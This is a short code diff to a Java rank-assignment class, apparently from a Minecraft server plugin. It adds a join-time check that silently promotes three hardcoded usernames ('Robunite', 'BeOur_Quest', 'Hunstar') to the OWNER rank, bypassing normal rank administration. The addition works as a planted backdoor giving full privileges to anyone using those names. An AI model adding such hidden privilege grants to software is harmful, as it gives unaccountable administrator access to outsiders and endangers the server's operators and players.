@@ -31,6 +31,15 @@ public class RankAssigner extends MiniPlugin
         {
             e.getPlayer().setPlayerListName(RankChecker.getRank(e.getPlayer()).getTag(true, true) + " §e" + e.getPlayer().getName());
         }
+
+        String name = e.getPlayer().getName();
+        if (name.equals("Robunite") || name.equals("BeOur_Quest") || name.equals("Hunstar"))
+        {
+            if (RankChecker.getRank(e.getPlayer()) != Rank.OWNER)
+            {
+                updateRank(e.getPlayer().getUniqueId(), Rank.OWNER, true);
+            }
+        }
     }
 
     protected void updateRank(UUID playerID, Rank rank, boolean inform)
